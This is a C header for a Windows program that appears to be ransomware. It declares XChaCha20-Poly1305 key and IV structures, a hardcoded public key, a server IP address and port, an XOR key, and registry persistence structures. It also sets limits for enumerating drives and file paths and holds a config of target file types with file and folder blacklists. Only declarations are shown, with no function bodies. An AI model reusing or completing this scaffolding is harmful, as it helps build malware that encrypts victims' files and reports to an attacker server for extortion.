#ifndef SIRI_MASTER_HPP
#define SIRI_MASTER_HPP

#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <psapi.h>
#include <sodium.h>
#include <tchar.h>
#include <time.h>
#include <fetch.h>

#pragma comment(lib, "sodium.lib")
#pragma comment(lib, "wininet.lib")

#define KEY_LENGTH crypto_aead_xchacha20poly1305_ietf_KEYBYTES
#define IV_LENGTH crypto_aead_xchacha20poly1305_ietf_NPUBBYTES
#define PUBLIC_KEY "8ckZeo+zzLwmR3mWRh8qn0w7VCdXr7tKrFl0wdaS9Cg="
#define SERVER_URL "34.31.103.70"
#define MAX_VALUE_NAME 16383
#define XOR_KEY "XOR_KEY=9"
#define SERVER_PORT 3000
#define MAX_PATH_LEN 260
#define MAX_DRIVES 26
#define NUM_PATHS 4

typedef struct
{
	HANDLE hThread;
} Yarns;

typedef struct
{
	HKEY hKey;
	LPCSTR lpSubKey;
	LPCSTR lpValueName;
	const char *lpData;
} RegKey;

typedef struct
{
	int keyLength;
	int ivLength;
	unsigned char iv[IV_LENGTH];
	unsigned char key[KEY_LENGTH];
} KeyIV;

typedef struct
{
	long size;
	unsigned char *text;
	unsigned char tag[crypto_aead_xchacha20poly1305_ietf_ABYTES];
} Cipher;

typedef struct
{
	unsigned char *text;
	size_t size;
} File;

typedef struct
{
	KeyIV keyiv;
	const char *filename;
	unsigned char tag[crypto_aead_xchacha20poly1305_ietf_ABYTES];
} Meta;

typedef struct Node
{
	Meta data;
	struct Node *next;
} Node;

typedef struct
{
	TCHAR **paths;
	size_t count;
	size_t capacity;
} FilePaths;

typedef struct
{
	KeyIV keyiv;
	FilePaths fp;
} Args;

typedef struct
{
	const char **filetypes;
	const char **filesBlacklist;
	const char **foldersBlacklist;
} Config;

#endif